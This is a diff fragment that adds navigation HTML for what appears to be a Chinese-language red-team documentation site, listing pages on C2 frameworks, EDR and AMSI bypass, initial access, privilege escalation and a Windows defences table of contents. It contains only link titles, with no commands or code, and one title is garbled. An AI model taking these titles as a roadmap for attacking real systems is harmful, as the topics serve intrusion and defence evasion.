+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-runbook/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Azure 服务 - Runbook 与自动化 (Runbook and Automation)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-storage-blob/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Azure 服务 - 存储 Blob (Storage Blob)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-virtual-machine/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Azure 服务 - 虚拟机 (Virtual Machine)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-web-apps/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Azure 服务 - Web 应用 (Web Apps)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-web-domains/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Azure 服务 - DNS 后缀 (DNS Suffix)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_3" id="__nav_5_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ibm
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Ibm
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/ibm/ibm-cloud-databases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IBM Cloud 托管数据库服务 (Managed Database Services)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/ibm/ibm-cloud-object-storage/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IBM Cloud 对象存储 (Object Storage)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Command control
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Command control
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../command-control/cobalt-strike-beacons/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cobalt Strike - Beacons
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../command-control/cobalt-strike-kits/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cobalt Strike - 工具包 (Kits)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../command-control/cobalt-strike/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cobalt Strike
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../command-control/metasploit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Metasploit
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../command-control/mythic/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mythic C2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Containers
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Containers
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../containers/docker/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Docker
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../containers/kubernetes/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kubernetes
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Databases
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Databases
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../databases/mssql-audit-checks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MSSQL - 审计自查 (Audit Checks)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../databases/mssql-command-execution/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MSSQL - 命令执行 (Command Execution)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../databases/mssql-credentials/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MSSQL - 凭据 (Credentials)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../databases/mssql-enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MSSQL - 数据库枚举 (Database Enumeration)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../databases/mssql-linked-database/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MSSQL - 链接数据库 (Linked Database)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Devops
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Devops
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../devops/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CI/CD 攻击 (CI/CD Attacks)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../devops/cicd-azure-devops/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CI/CD - Azure DevOps
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../devops/cicd-buildkite/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CI/CD - BuildKite
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../devops/cicd-circle-ci/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CI/CD - CircleCI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../devops/cicd-drone-ci/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CI/CD - Drone CI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../devops/cicd-github-actions/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CI/CD - GitHub Actions
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../devops/cicd-gitlab-ci/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CI/CD - GitLab CI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../devops/package-managers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    包管理器与构建文件 (Package Managers and Build Files)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../devops/secrets-enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    硬编码密钥枚举 (Hardcoded Secrets Enumeration)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
+        
+          
+          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Methodology
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_10">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Methodology
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../methodology/android-applications/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    安卓应用 (Android Application)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../methodology/bug-hunting-methodology/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    漏洞挖掘方法论 (Bug Hunting Methodology)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../methodology/source-code-analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    源代码分析 (Source Code Analysis)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../methodology/vulnerability-reports/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    漏洞报告 (Vulnerability Reports)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Redteam
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_11">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Redteam
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_11_1" id="__nav_11_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Access
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_11_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Access
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../access/clickfix/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ClickFix
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../access/html-smuggling/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HTML 走私 (HTML Smuggling)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../access/initial-access/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    初始访问 (Initial Access)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../access/office-attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Office - 攻击
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../access/phishing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    钓鱼 (Phishing)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../access/web-attack-surface/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web 攻击面 (Web Attack Surface)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../access/windows-download-execute/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows - 下载并执行方法
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../access/windows-using-credentials/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows - 浣跨敤鍑瘉 (Using credentials)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_11_2" id="__nav_11_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Escalation
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_11_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Escalation
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../escalation/linux-privilege-escalation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux - 提权
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../escalation/windows-privilege-escalation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows - 权限提升 (Privilege Escalation)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_11_3" id="__nav_11_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Evasion
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_11_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Evasion
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../edr-bypass/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    终端检测与响应 (Endpoint Detection and Response / EDR)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../elastic-edr/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Elastic EDR
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../linux-evasion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux - 规避 (Evasion)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../opsec-fails/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    运维安全 (OPSEC)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../proxy-bypass/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    代理绕过 (Proxy Bypass)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../windows-amsi-bypass/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows - AMSI 绕过 (AMSI Bypass)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows - 防御
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows - 防御
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        摘要
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#applocker" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        AppLocker
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#uac" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        用户账户控制 (UAC)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dpapi" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DPAPI
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#powershell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Powershell
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Powershell">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#execution-policy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        执行策略 (Execution Policy)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#amsi" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        反恶意软件扫描接口 (AMSI)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jea" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        恰到好处的管理 (JEA)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#clm" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        受限语言模式 (CLM)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        脚本块与模块日志记录
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#powershell-transcript" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PowerShell 成文记录 (Transcript)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#securestring" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        安全字符串 (SecureString)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ppl" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        受保护进程光 (PPL)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#credential-guard" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        凭据守卫 (Credential Guard)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-etw" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Windows 事件跟踪 (ETW)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#asr" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        攻击面减少 (ASR)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-defender" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Windows Defender 防病毒
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-defender_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Windows Defender 应用程序控制
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-defender_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Windows Defender 防火墙
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-wip" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Windows 信息保护 (WIP)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bitlocker" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BitLocker 驱动器加密
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        参考资料
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../windows-dpapi/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows - DPAPI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_11_4" id="__nav_11_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Persistence
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_11_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Persistence
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../persistence/linux-persistence/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux - 持久化 (Persistence)
+  
